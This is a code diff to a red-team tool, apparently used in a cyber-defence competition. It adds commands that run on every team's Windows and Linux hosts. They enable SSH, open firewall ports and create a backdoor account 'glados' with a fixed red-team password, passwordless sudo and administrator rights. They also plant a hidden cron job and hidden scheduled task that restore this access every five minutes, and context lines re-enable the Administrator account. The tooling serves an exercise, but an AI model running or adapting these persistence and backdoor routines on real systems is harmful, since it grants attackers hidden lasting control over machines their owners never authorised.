@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
-import concurrent.futures
-import subprocess
 import base64
+import concurrent.futures
+import json
+import os
+import subprocess
 from dataclasses import dataclass, field
 from datetime import datetime
+from pathlib import Path
 from typing import Dict, List, Optional, Tuple
 
 from .common import TEAM_SUBNET_BASE, find_missing_binaries, get_red_team_ip
@@ -24,21 +27,55 @@ class Target:
     hostname: str
     host_id: int
     os_type: str
+    services: List[str] = field(default_factory=list)
 
     def wan_ip(self, team: int) -> str:
         return f"192.168.{TEAM_SUBNET_BASE + team}.{self.host_id}"
 
+    def get_wan_ip(self, team: int) -> str:
+        return self.wan_ip(team)
 
-TARGETS = [
-    Target("curiosity", 140, "windows"),
-    Target("morality", 10, "windows"),
-    Target("anger", 70, "windows"),
-    Target("space", 141, "windows"),
-    Target("scalable", 73, "linux"),
-    Target("safety", 12, "linux"),
-    Target("storage", 14, "linux"),
-    Target("cake", 143, "linux"),
+DEFAULT_TARGETS = [
+    Target("curiosity", 140, "windows", ["smb", "winrm", "rdp"]),
+    Target("morality", 10, "windows", ["smb", "winrm", "rdp", "http"]),
+    Target("anger", 70, "windows", ["smb", "winrm", "rdp", "dns"]),
+    Target("space", 141, "windows", ["smb", "winrm", "rdp"]),
+    Target("scalable", 73, "linux", ["ssh", "http"]),
+    Target("safety", 12, "linux", ["ssh", "http", "ftp"]),
+    Target("storage", 14, "linux", ["ssh", "http", "mysql"]),
+    Target("cake", 143, "linux", ["ssh", "http"]),
 ]
+
+
+def load_targets() -> List[Target]:
+    targets_path = Path(
+        os.environ.get(
+            "APERTURE_TARGETS_FILE",
+            Path(__file__).resolve().parents[1] / "config" / "targets.json",
+        )
+    )
+    if not targets_path.exists():
+        return list(DEFAULT_TARGETS)
+    try:
+        with targets_path.open("r", encoding="utf-8") as handle:
+            payload = json.load(handle)
+        loaded = []
+        for entry in payload:
+            loaded.append(
+                Target(
+                    entry["hostname"],
+                    entry["host_id"],
+                    entry["os_type"],
+                    entry.get("services", []),
+                )
+            )
+        return loaded
+    except Exception as exc:
+        print(f"[!] Failed to load targets from {targets_path}: {exc}")
+        return list(DEFAULT_TARGETS)
+
+
+TARGETS = load_targets()
 
 
 class RemoteExecutor:
@@ -348,6 +385,114 @@ echo "ROOT_WEAKENED"
 net user Administrator /active:yes 2>$null
 net user Administrator {REDTEAM_PASS} 2>$null
 Write-Output "ADMIN_WEAKENED"
+'''
+        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
+
+    def ensure_remote_access(self, targets: List[str]) -> Dict:
+        linux_cmd = '''
+ensure_ssh() {
+    if command -v systemctl >/dev/null 2>&1; then
+        systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
+        systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
+    elif command -v service >/dev/null 2>&1; then
+        service ssh restart 2>/dev/null || service sshd restart 2>/dev/null || true
+    fi
+}
+open_firewall() {
+    if command -v ufw >/dev/null 2>&1; then
+        ufw allow 22/tcp >/dev/null 2>&1 || true
+    fi
+    if command -v firewall-cmd >/dev/null 2>&1; then
+        firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1 || true
+        firewall-cmd --reload >/dev/null 2>&1 || true
+    fi
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -I INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || true
+    fi
+}
+ensure_ssh
+open_firewall
+echo "ACCESS_OPENED"
+'''
+        windows_cmd = '''
+$ssh = Get-Service -Name sshd -ErrorAction SilentlyContinue
+if ($ssh) {
+    Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name sshd -ErrorAction SilentlyContinue
+}
+New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
+Write-Output "ACCESS_OPENED"
+'''
+        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
+
+    def install_access_tasks(self, targets: List[str]) -> Dict:
+        linux_cmd = f'''
+ACCESS_DIR="/tmp/.aperture_science"
+ACCESS_SCRIPT="$ACCESS_DIR/access_maintenance.sh"
+mkdir -p "$ACCESS_DIR"
+cat > "$ACCESS_SCRIPT" << 'ACCESS'
+#!/bin/sh
+ensure_ssh() {{
+    if command -v systemctl >/dev/null 2>&1; then
+        systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
+        systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
+    elif command -v service >/dev/null 2>&1; then
+        service ssh restart 2>/dev/null || service sshd restart 2>/dev/null || true
+    fi
+}}
+open_firewall() {{
+    if command -v ufw >/dev/null 2>&1; then
+        ufw allow 22/tcp >/dev/null 2>&1 || true
+    fi
+    if command -v firewall-cmd >/dev/null 2>&1; then
+        firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1 || true
+        firewall-cmd --reload >/dev/null 2>&1 || true
+    fi
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -I INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || true
+    fi
+}}
+if command -v useradd >/dev/null 2>&1; then
+    useradd -m -s /bin/bash -c "Genetic Lifeform and Disk Operating System" glados 2>/dev/null || true
+elif command -v adduser >/dev/null 2>&1; then
+    adduser -D glados 2>/dev/null || adduser --disabled-password --gecos "" glados 2>/dev/null || true
+fi
+echo "glados:{REDTEAM_PASS}" | chpasswd 2>/dev/null || true
+if getent group sudo >/dev/null 2>&1; then
+    usermod -aG sudo glados 2>/dev/null || true
+elif getent group wheel >/dev/null 2>&1; then
+    usermod -aG wheel glados 2>/dev/null || true
+fi
+echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
+chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
+ensure_ssh
+open_firewall
+ACCESS
+chmod +x "$ACCESS_SCRIPT"
+(crontab -l 2>/dev/null | grep -v "access_maintenance.sh"; echo "*/5 * * * * $ACCESS_SCRIPT") | crontab -
+echo "ACCESS_TASKS_INSTALLED"
+'''
+        windows_cmd = f'''
+$ApertureDir = "$env:TEMP\\ApertureScience"
+New-Item -ItemType Directory -Force -Path $ApertureDir | Out-Null
+$AccessScript = @'
+$ssh = Get-Service -Name sshd -ErrorAction SilentlyContinue
+if ($ssh) {{
+    Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name sshd -ErrorAction SilentlyContinue
+}}
+New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
+net user glados {REDTEAM_PASS} /add 2>$null
+net localgroup Administrators glados /add 2>$null
+'@
+Set-Content -Path "$ApertureDir\\access_maintenance.ps1" -Value $AccessScript
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\access_maintenance.ps1"
+$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
+$Settings = New-ScheduledTaskSettingsSet -Hidden
+Register-ScheduledTask -TaskName "ApertureAccess" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+Write-Output "ACCESS_TASKS_INSTALLED"
 '''
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
